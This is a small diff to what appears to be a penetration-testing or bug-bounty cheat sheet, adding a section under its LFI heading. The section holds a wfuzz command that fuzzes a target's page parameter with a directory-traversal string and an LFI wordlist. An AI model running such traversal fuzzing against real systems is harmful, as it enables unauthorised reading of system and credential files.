@@ -148,6 +148,11 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 
 ## **LFI**
 
+### FUZZ
+
+```bash
+wfuzz -c -w <lfi.txt> --hw 0 <target>?page=../../../../../../../FUZZ
+```
 
 ### Get shell
 
